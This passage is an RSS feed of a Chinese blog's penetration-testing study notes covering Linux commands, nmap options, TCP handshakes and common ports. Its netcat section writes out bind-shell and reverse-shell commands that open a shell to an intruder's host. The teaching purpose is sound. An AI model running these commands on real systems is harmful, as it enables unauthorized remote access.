<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>渗透测试微专业 on Retr0的小窝</title>
        <link>https://www.retr0.qzz.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%B8%93%E4%B8%9A/</link>
        <description>Recent content in 渗透测试微专业 on Retr0的小窝</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Retr0</copyright>
        <lastBuildDate>Sun, 23 Nov 2025 22:19:56 +0800</lastBuildDate><atom:link href="https://www.retr0.qzz.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%B8%93%E4%B8%9A/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>1.2 kali基础知识和指令及几个小工具</title>
        <link>https://www.retr0.qzz.io/p/1.2-kali%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E6%8C%87%E4%BB%A4%E5%8F%8A%E5%87%A0%E4%B8%AA%E5%B0%8F%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Sun, 23 Nov 2025 22:19:56 +0800</pubDate>
        
        <guid>https://www.retr0.qzz.io/p/1.2-kali%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E6%8C%87%E4%BB%A4%E5%8F%8A%E5%87%A0%E4%B8%AA%E5%B0%8F%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h1 id=&#34;知识和指令&#34;&gt;知识和指令
&lt;/h1&gt;&lt;h2 id=&#34;基础知识&#34;&gt;基础知识
&lt;/h2&gt;&lt;h3 id=&#34;文件属性&#34;&gt;文件属性
&lt;/h3&gt;&lt;p&gt;示例：&lt;code&gt;d r-x(A) r-x(B) r-x(C) 13 root(D) root(E) 0 Nov 3 11:22 1.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;括号部分仅作讲解用，实际上不存在&lt;/p&gt;
&lt;p&gt;A=所有者权限&lt;/p&gt;
&lt;p&gt;B=所有者所在的组的权限&lt;/p&gt;
&lt;p&gt;C=其他人权限&lt;/p&gt;
&lt;p&gt;D=文件的所有人&lt;/p&gt;
&lt;p&gt;E=D所在的组&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;类型：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;d&lt;/code&gt;文件夹&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-&lt;/code&gt;文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;l&lt;/code&gt;链接&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;权限：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;r=read=4  w=write=2  x=execute=1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;权限编号的计算使用加法，例如：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;权限代码&lt;/th&gt;
          &lt;th&gt;编号&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;r-x&lt;/td&gt;
          &lt;td&gt;5&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-rw&lt;/td&gt;
          &lt;td&gt;6&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;ndash;r&lt;/td&gt;
          &lt;td&gt;4&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;修改文件权限：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chmod [权限编号] [目标文件]&lt;/code&gt;	修改文件权限&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chmod [权限编号] -R [文件夹]&lt;/code&gt;	把文件夹和文件内所有东西都赋值为75&lt;/p&gt;
&lt;p&gt;示例：&lt;code&gt;chmod 755 1.txt&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;系统操作&#34;&gt;系统操作
&lt;/h3&gt;&lt;h4 id=&#34;防火墙&#34;&gt;防火墙
&lt;/h4&gt;&lt;p&gt;&lt;code&gt;chkconfig iptables on/off&lt;/code&gt;	打开/关闭防火墙&lt;/p&gt;
&lt;h4 id=&#34;apt命令&#34;&gt;apt命令
&lt;/h4&gt;&lt;p&gt;软件安装&lt;code&gt;apt-get install xxx&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;基础指令&#34;&gt;基础指令：
&lt;/h2&gt;&lt;h3 id=&#34;系统指令&#34;&gt;系统指令：
&lt;/h3&gt;&lt;h4 id=&#34;系统相关&#34;&gt;系统相关
&lt;/h4&gt;&lt;p&gt;&lt;code&gt;passwd&lt;/code&gt;			修改当前用户密码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ifconfig&lt;/code&gt;		查看ip&lt;/p&gt;
&lt;p&gt;&lt;code&gt;whoami&lt;/code&gt;			查看自己是谁（账户）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;clear&lt;/code&gt;			清空当前终端&lt;/p&gt;
&lt;p&gt;&lt;code&gt;uname&lt;/code&gt;			查看操作系统&lt;/p&gt;
&lt;p&gt;&lt;code&gt;uname -a&lt;/code&gt;		查看详细版本号&lt;/p&gt;
&lt;h4 id=&#34;文件相关&#34;&gt;文件相关
&lt;/h4&gt;&lt;p&gt;&lt;code&gt;ls&lt;/code&gt;				查看当前目录所有文件和文件夹&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ls -la&lt;/code&gt;			查看详细信息（文件属性）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mkdir&lt;/code&gt;			创建目录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cd&lt;/code&gt;				转到指定目录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;touch&lt;/code&gt;			创建文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cat&lt;/code&gt;			查看文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chmod&lt;/code&gt;			修改文件权限&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cp [被复制的文件] [复制到（包括文件名）]&lt;/code&gt;	复制文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mv [被剪切的文件] [粘贴到（包括文件名）]&lt;/code&gt;	剪切文件（也可用于修改文件名）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rm [目标]&lt;/code&gt;		删除&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rm -rf [目标]&lt;/code&gt;	全部强制删除&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find [要砸那个地方查找] -name [查找的文件名]&lt;/code&gt;	查找文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo xxx&lt;/code&gt;		回响（单独使用是复读机）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo xxx &amp;gt; 1.txt&lt;/code&gt;	创建名为1.txt的文件并写入xxx（有覆盖效果）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo xxx &amp;gt;&amp;gt; 1.txt&lt;/code&gt;	向1.txt中追加xxx&lt;/p&gt;
&lt;h4 id=&#34;查看进程&#34;&gt;查看进程
&lt;/h4&gt;&lt;p&gt;&lt;code&gt;ps&lt;/code&gt;					查看进程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ps -ef&lt;/code&gt;				查看全部进程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ps -ef | grep xxx&lt;/code&gt;	查看进程名字包含xxx关键词的进程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;top&lt;/code&gt;			查看进程（打开性能监视器）&lt;/p&gt;
&lt;h3 id=&#34;软件指令&#34;&gt;软件指令：
&lt;/h3&gt;&lt;h4 id=&#34;编辑器类&#34;&gt;编辑器类：
&lt;/h4&gt;&lt;p&gt;&lt;code&gt;nano&lt;/code&gt;			用nano打开文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vim&lt;/code&gt;			用vim打开文件&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;几个小工具&#34;&gt;几个小工具
&lt;/h1&gt;&lt;h2 id=&#34;nc的使用&#34;&gt;nc的使用
&lt;/h2&gt;&lt;h3 id=&#34;基础连接&#34;&gt;基础连接
&lt;/h3&gt;&lt;p&gt;服务端(被控)：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -l -p [端口号]&lt;/code&gt;			监听指定端口&lt;/p&gt;
&lt;p&gt;客户端(控制)：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -nv [服务端ip] [端口号]&lt;/code&gt;	连接服务端&lt;/p&gt;
&lt;h3 id=&#34;远程控制&#34;&gt;远程控制
&lt;/h3&gt;&lt;h4 id=&#34;正向控制&#34;&gt;正向控制
&lt;/h4&gt;&lt;p&gt;入侵者每次主动连接目标&lt;/p&gt;
&lt;p&gt;目标(被控)：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -lp [端口号] -e cmd&lt;/code&gt;		指客户端连接后为其打开cmd&lt;/p&gt;
&lt;p&gt;入侵：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -nv [服务端ip] [端口号]&lt;/code&gt;	连接目标&lt;/p&gt;
&lt;h4 id=&#34;反向控制&#34;&gt;反向控制
&lt;/h4&gt;&lt;p&gt;目标每次自己连接入侵者&lt;/p&gt;
&lt;p&gt;目标(被控)：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -nv [入侵者ip] [端口号] -e cmd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：如果目标系统为linux则将&lt;/strong&gt;&lt;code&gt;-e cmd&lt;/code&gt;&lt;strong&gt;改为&lt;/strong&gt;&lt;code&gt;-c bash&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;nmap的使用&#34;&gt;nmap的使用
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;nmap [可选参数] [目标ip]&lt;/code&gt;	普通扫描&lt;/p&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-sT&lt;/code&gt;	tcp扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-sS&lt;/code&gt;	隐秘扫描（不形成三次握手）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-sL&lt;/code&gt;	[扫描一个ip段] 例如192.168.0.1/24 (指从192.168.0.1到192.168.0.255) 主要用于批量主机发现&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-sn&lt;/code&gt;	ping扫描，只发现主机，不扫描端口，通常结合&lt;code&gt;-sL&lt;/code&gt;使用&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-Pn&lt;/code&gt;	将所有主机假定开机，跳过主机发现的过程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-P0&lt;/code&gt;	使用ip协议探测主机是否开启&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-sU&lt;/code&gt;	使用UDP扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-p&lt;/code&gt;		指定扫描那些端口，例如&lt;code&gt;nmap -p 80,443,3380 192.168.1.0/24&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-O&lt;/code&gt;		识别操作系统&lt;/p&gt;
&lt;h1 id=&#34;追加网络相关&#34;&gt;追加：网络相关
&lt;/h1&gt;&lt;h2 id=&#34;tcp的三次握手与四次挥手&#34;&gt;TCP的三次握手与四次挥手
&lt;/h2&gt;&lt;p&gt;TCP（Transmission Control Protocol，传输控制协议）是 &lt;strong&gt;面向连接、可靠的字节流协议&lt;/strong&gt;，其核心机制 “三次握手”（建立连接）和 “四次挥手”（释放连接）是保障数据可靠传输的基础。&lt;/p&gt;
&lt;h3 id=&#34;核心前提tcp-报文关键字段&#34;&gt;核心前提：TCP 报文关键字段
&lt;/h3&gt;&lt;p&gt;在理解握手 / 挥手前，需先掌握 TCP 报文中的 3 个核心标志位和 2 个序列号字段，这是通信的 “信号标识”：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;&lt;strong&gt;字段&lt;/strong&gt;&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;&lt;strong&gt;作用&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;SYN&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;同步标志（Synchronize）：用于发起连接，请求同步对方的序列号（&lt;code&gt;seq&lt;/code&gt;）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;ACK&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;确认标志（Acknowledgment）：用于确认收到数据，携带确认号（&lt;code&gt;ack&lt;/code&gt;）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;FIN&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;终止标志（Finish）：用于发起连接释放，告知对方 “我已无数据要发送”&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;seq（序列号）&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;标记当前发送数据的字节位置（随机初始化，后续按字节递增）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;ack（确认号）&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;标记 “期望下次收到的对方序列号”（= 已收到的对方 seq + 1）&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;注：TCP 是&lt;strong&gt;全双工通信&lt;/strong&gt;（双方可同时发送数据），因此每个方向都需要独立的序列号和确认机制。&lt;/p&gt;
&lt;h3 id=&#34;三次握手three-way-handshake建立可靠连接&#34;&gt;三次握手（Three-Way Handshake）：建立可靠连接
&lt;/h3&gt;&lt;h4 id=&#34;核心目的&#34;&gt;&lt;strong&gt;核心目的：&lt;/strong&gt;
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;双方确认彼此的 “发送能力” 和 “接收能力” 均正常；&lt;/li&gt;
&lt;li&gt;协商初始序列号（&lt;code&gt;seq&lt;/code&gt;），为后续数据传输的 “有序性” 和 “去重” 打下基础；&lt;/li&gt;
&lt;li&gt;避免 “失效的连接请求报文段” 导致错误连接。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;步骤拆解&#34;&gt;步骤拆解：
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;第一次握手（客户端→服务器）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;客户端发送报文：&lt;code&gt;SYN=1&lt;/code&gt;（发起连接），&lt;code&gt;seq=x&lt;/code&gt;（x 是客户端随机生成的初始序列号，如 1000）；&lt;/li&gt;
&lt;li&gt;客户端状态变为 &lt;code&gt;SYN_SENT&lt;/code&gt;（等待服务器确认）；&lt;/li&gt;
&lt;li&gt;作用：告诉服务器 “我想和你建立连接，请你同步我的序列号”。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第二次握手（服务器→客户端）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;服务器收到 SYN 后，回复报文：&lt;code&gt;SYN=1&lt;/code&gt;（同意建立连接，同步自己的序列号）+ &lt;code&gt;ACK=1&lt;/code&gt;（确认收到客户端的 SYN）；&lt;/li&gt;
&lt;li&gt;服务器序列号：&lt;code&gt;seq=y&lt;/code&gt;（y 是服务器随机生成的初始序列号，如 2000）；&lt;/li&gt;
&lt;li&gt;服务器确认号：&lt;code&gt;ack=x+1&lt;/code&gt;（表示 “我已收到你到 x 的所有数据，下次请从 x+1 开始发”）；&lt;/li&gt;
&lt;li&gt;服务器状态变为 &lt;code&gt;SYN_RCVD&lt;/code&gt;（等待客户端最终确认）；&lt;/li&gt;
&lt;li&gt;作用：服务器同时完成 “确认客户端接收 / 发送能力” 和 “发起自己的连接同步”。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第三次握手（客户端→服务器）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;客户端收到服务器的 SYN+ACK 后，回复报文：&lt;code&gt;ACK=1&lt;/code&gt;（确认收到服务器的 SYN）；&lt;/li&gt;
&lt;li&gt;客户端序列号：&lt;code&gt;seq=x+1&lt;/code&gt;（按字节递增，因第一次仅发送了 SYN 标志位，无数据字节，故 + 1）；&lt;/li&gt;
&lt;li&gt;客户端确认号：&lt;code&gt;ack=y+1&lt;/code&gt;（表示 “我已收到你到 y 的所有数据，下次请从 y+1 开始发”）；&lt;/li&gt;
&lt;li&gt;客户端状态变为 &lt;code&gt;ESTABLISHED&lt;/code&gt;（连接建立），服务器收到后也变为 &lt;code&gt;ESTABLISHED&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;作用：客户端最终确认服务器的连接请求，双方完成 “双向能力验证” 和 “序列号协商”。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;关键设计逻辑为什么是-三次-而不是-两次&#34;&gt;&lt;strong&gt;关键设计逻辑：为什么是 “三次” 而不是 “两次”？&lt;/strong&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;两次握手的风险&lt;/strong&gt;：若客户端发送的 “连接请求报文段” 因网络延迟未及时到达服务器，客户端会超时重发。若延迟的报文段后续到达服务器，服务器会误以为是新的连接请求，直接回复 SYN+ACK 并建立连接，但客户端此时已不需要该连接，会忽略服务器的回复，导致服务器资源被浪费（半连接状态）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;三次握手的必要性&lt;/strong&gt;：第三次握手是客户端对服务器 SYN 的确认，确保 “服务器知道客户端已收到自己的连接响应”，从而避免上述资源浪费。只有三次握手，才能实现双方 “双向可靠确认”。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;四次挥手four-way-wavehand释放连接&#34;&gt;四次挥手（Four-Way Wavehand）：释放连接
&lt;/h3&gt;&lt;h4 id=&#34;核心目的-1&#34;&gt;&lt;strong&gt;核心目的&lt;/strong&gt;
&lt;/h4&gt;&lt;p&gt;TCP 是全双工通信，双方可同时发送数据。释放连接时，需确保：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;双方都已完成数据传输（无未发送 / 未接收的数据）；&lt;/li&gt;
&lt;li&gt;双方都明确 “对方已停止发送数据”，避免提前关闭连接导致数据丢失。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;步骤拆解-1&#34;&gt;步骤拆解：
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;第一次挥手（客户端→服务器）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;客户端完成数据发送后，发送报文：&lt;code&gt;FIN=1&lt;/code&gt;（告知服务器 “我已无数据要发，请求关闭我的发送通道”）；&lt;/li&gt;
&lt;li&gt;客户端序列号：&lt;code&gt;seq=x+1&lt;/code&gt;（基于之前的数据传输进度，假设之前已发送到 x）；&lt;/li&gt;
&lt;li&gt;客户端确认号：&lt;code&gt;ack=y+1&lt;/code&gt;（确认之前收到的服务器数据）；&lt;/li&gt;
&lt;li&gt;客户端状态变为 &lt;code&gt;FIN_WAIT_1&lt;/code&gt;（等待服务器确认关闭）；&lt;/li&gt;
&lt;li&gt;注意：客户端关闭的是 “发送通道”，仍可接收服务器的数据（全双工特性）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第二次挥手（服务器→客户端）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;服务器收到 FIN 后，回复报文：&lt;code&gt;ACK=1&lt;/code&gt;（确认收到客户端的关闭请求）；&lt;/li&gt;
&lt;li&gt;服务器序列号：&lt;code&gt;seq=y+1&lt;/code&gt;（基于之前的传输进度）；&lt;/li&gt;
&lt;li&gt;服务器确认号：&lt;code&gt;ack=x+2&lt;/code&gt;（因客户端发送了 FIN 标志位，相当于 1 个字节的 “关闭请求数据”，故 x+1+1=x+2）；&lt;/li&gt;
&lt;li&gt;服务器状态变为 &lt;code&gt;CLOSE_WAIT&lt;/code&gt;（等待自己的数据发送完成后，再关闭自己的发送通道）；&lt;/li&gt;
&lt;li&gt;客户端收到后，状态变为 &lt;code&gt;FIN_WAIT_2&lt;/code&gt;（等待服务器的 FIN 报文）；&lt;/li&gt;
&lt;li&gt;作用：服务器确认 “客户端不再发送数据”，但自己可能仍有数据要发给客户端（如剩余的响应数据）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第三次挥手（服务器→客户端）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;服务器完成所有数据发送后，发送报文：&lt;code&gt;FIN=1&lt;/code&gt;（告知客户端 “我也无数据要发，请求关闭我的发送通道”）；&lt;/li&gt;
&lt;li&gt;服务器序列号：&lt;code&gt;seq=y+1&lt;/code&gt;（无新数据发送，序列号不变）；&lt;/li&gt;
&lt;li&gt;服务器确认号：&lt;code&gt;ack=x+2&lt;/code&gt;（与第二次挥手一致）；&lt;/li&gt;
&lt;li&gt;服务器状态变为 &lt;code&gt;LAST_ACK&lt;/code&gt;（等待客户端最终确认）；&lt;/li&gt;
&lt;li&gt;作用：服务器关闭自己的发送通道，告知客户端 “可以彻底关闭连接了”。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第四次挥手（客户端→服务器）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;客户端收到服务器的 FIN 后，回复报文：&lt;code&gt;ACK=1&lt;/code&gt;（确认收到服务器的关闭请求）；&lt;/li&gt;
&lt;li&gt;客户端序列号：&lt;code&gt;seq=x+2&lt;/code&gt;（基于之前的确认号）；&lt;/li&gt;
&lt;li&gt;客户端确认号：&lt;code&gt;ack=y+2&lt;/code&gt;（服务器的 FIN 相当于 1 个字节，故 y+1+1=y+2）；&lt;/li&gt;
&lt;li&gt;客户端状态变为 &lt;code&gt;TIME_WAIT&lt;/code&gt;（等待 2MSL 后关闭），服务器收到后状态变为 &lt;code&gt;CLOSED&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;客户端等待 2MSL（Maximum Segment Lifetime，报文最大生存时间，默认 2 分钟）后，状态变为 &lt;code&gt;CLOSED&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;作用：确保服务器能收到客户端的最终确认（避免服务器因报文丢失而重发 FIN）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;关键设计逻辑为什么是-四次-而不是-三次&#34;&gt;关键设计逻辑：为什么是 “四次” 而不是 “三次”？
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;核心原因&lt;/strong&gt;：TCP 是全双工通信，双方的 “发送通道” 需要独立关闭。&lt;/li&gt;
&lt;li&gt;第三次握手时，服务器可以同时发送 SYN 和 ACK（因为此时服务器还未发送数据，可合并报文）；&lt;/li&gt;
&lt;li&gt;四次挥手时，服务器收到客户端的 FIN 后，可能仍有数据要发送，无法立即发送 FIN（需先完成数据传输），因此必须分两步：先回复 ACK（确认客户端关闭），再发送 FIN（自己关闭），导致比三次握手多一次报文交互。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;关键细节time_wait-状态的作用&#34;&gt;关键细节：TIME_WAIT 状态的作用
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;目的 1&lt;/strong&gt;：确保最后一个 ACK 报文能到达服务器（若服务器未收到 ACK，会重发 FIN，客户端在 TIME_WAIT 期间可重新回复）；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;目的 2&lt;/strong&gt;：避免 “失效的报文段” 干扰新连接（TIME_WAIT 期间，客户端会丢弃所有来自该连接的旧报文段）；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实际影响&lt;/strong&gt;：服务器若频繁关闭连接，会积累大量 TIME_WAIT 状态的端口，导致端口耗尽（可通过调整&lt;code&gt;net.ipv4.tcp_tw_reuse&lt;/code&gt;等内核参数优化）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;端口&#34;&gt;端口
&lt;/h2&gt;&lt;p&gt;端口是计算机网络中用于区分不同服务/应用的逻辑地址（范围：0-65535），按用途可分为 &lt;strong&gt;知名端口（0-1023）&lt;/strong&gt;、&lt;strong&gt;注册端口（1024-49151）&lt;/strong&gt; 和 &lt;strong&gt;动态端口（49152-65535）&lt;/strong&gt;。以下是开发者和日常使用中最常见的端口及其核心特点，按场景分类整理，方便查阅：&lt;/p&gt;
&lt;h3 id=&#34;核心网络服务端口知名端口0-1023&#34;&gt;核心网络服务端口（知名端口，0-1023）
&lt;/h3&gt;&lt;p&gt;这类端口由 IANA 分配，对应基础网络服务，默认端口固定，是网络通信的基础。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;端口号&lt;/th&gt;
          &lt;th&gt;协议&lt;/th&gt;
          &lt;th&gt;服务/应用&lt;/th&gt;
          &lt;th&gt;核心特点&lt;/th&gt;
          &lt;th&gt;使用场景&lt;/th&gt;
          &lt;th&gt;安全注意事项&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;21&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;FTP（文件传输）&lt;/td&gt;
          &lt;td&gt;明文传输用户名/密码和文件数据，不加密；主动模式（服务器连客户端20端口）/被动模式&lt;/td&gt;
          &lt;td&gt;传统文件传输（已逐渐被替代）&lt;/td&gt;
          &lt;td&gt;风险极高！明文传输易被窃听，建议用 &lt;strong&gt;SFTP（22端口）&lt;/strong&gt; 或 &lt;strong&gt;FTPS&lt;/strong&gt; 替代&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;22&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;SSH（安全外壳）&lt;/td&gt;
          &lt;td&gt;加密远程登录/命令执行，支持端口转发、文件传输（SFTP），替代Telnet&lt;/td&gt;
          &lt;td&gt;服务器远程管理（Linux/云服务器）&lt;/td&gt;
          &lt;td&gt;建议修改默认端口（如2222），禁用密码登录（仅用SSH密钥），限制登录IP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;23&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;Telnet（远程登录）&lt;/td&gt;
          &lt;td&gt;明文传输，无加密，安全性极差&lt;/td&gt;
          &lt;td&gt;早期设备管理（已淘汰）&lt;/td&gt;
          &lt;td&gt;完全不推荐使用！用SSH（22端口）替代&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;25&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;SMTP（邮件发送）&lt;/td&gt;
          &lt;td&gt;用于邮件服务器之间发送邮件，或客户端向服务器提交邮件（需配合认证）&lt;/td&gt;
          &lt;td&gt;邮件服务（如Postfix、Sendmail）&lt;/td&gt;
          &lt;td&gt;默认无加密，建议开启TLS（465端口），配置SPF/DKIM防止邮件伪造&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;53&lt;/td&gt;
          &lt;td&gt;TCP/UDP&lt;/td&gt;
          &lt;td&gt;DNS（域名解析）&lt;/td&gt;
          &lt;td&gt;UDP用于普通查询（快，无连接）；TCP用于区域传输（数据量大，可靠）&lt;/td&gt;
          &lt;td&gt;域名解析（如访问网站、API）&lt;/td&gt;
          &lt;td&gt;开放公共DNS需注意防护DDoS攻击；内网建议部署本地DNS缓存（如Pi-hole）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;80&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;HTTP（超文本传输）&lt;/td&gt;
          &lt;td&gt;明文传输网页数据，无加密，是Web服务默认端口&lt;/td&gt;
          &lt;td&gt;普通网站访问、HTTP API&lt;/td&gt;
          &lt;td&gt;仅用于测试/内部服务，公网必须升级为HTTPS（443端口），否则数据易被篡改窃听&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;443&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;HTTPS（加密HTTP）&lt;/td&gt;
          &lt;td&gt;基于TLS/SSL加密，保障数据传输安全，支持HTTP/2、HTTP/3&lt;/td&gt;
          &lt;td&gt;HTTPS网站、加密API、小程序&lt;/td&gt;
          &lt;td&gt;必须配置有效SSL证书（Let’s Encrypt免费），禁用弱加密套件（如TLS 1.0/1.1）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;110&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;POP3（邮件接收）&lt;/td&gt;
